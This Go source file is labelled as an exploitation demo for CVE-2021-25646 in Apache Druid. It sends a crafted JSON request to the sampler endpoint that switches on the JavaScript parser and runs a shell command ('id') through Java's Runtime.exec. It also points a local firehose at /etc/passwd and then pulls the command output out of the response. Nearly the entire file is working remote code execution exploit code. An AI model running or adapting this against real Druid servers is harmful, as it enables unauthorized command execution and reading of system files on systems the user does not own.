package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func run(host string) (bool, string) {
	// CVE-2021-25646 利用 Demo
	uri := "/druid/indexer/v1/sampler"
	method := "POST"
	url := host + uri
	payload := strings.NewReader(`{
    "type":"index",
    "spec":{
        "ioConfig":{
            "type":"index",
            "firehose":{
                "type":"local",
                "baseDir":"/etc",
                "filter":"passwd"
            }
        },
        "dataSchema":{
            "dataSource":"test",
            "parser":{
                "parseSpec":{
                "format":"javascript",
                "timestampSpec":{

                },
                "dimensionsSpec":{

                },
                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                "":{
                    "enabled":"true"
                }
                }
            }
        }
    },
    "samplerConfig":{
        "numRows":10
    }
}`)

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		return false, err.Error()
	}
	req.Header.Add("User-Agent", "Apifox/1.0.0 (https://apifox.com)")
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return false, err.Error()

	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return false, err.Error()

	}
	var data map[string]interface{}
	err = json.Unmarshal(body, &data)
	if err != nil {
		return false, err.Error()
	}

	testValue := data["data"].([]interface{})[0].(map[string]interface{})["input"].(map[string]interface{})["test"]
	return true, testValue.(string)
}
func main() {
	fmt.Println(run("http://localhost:9000"))
}
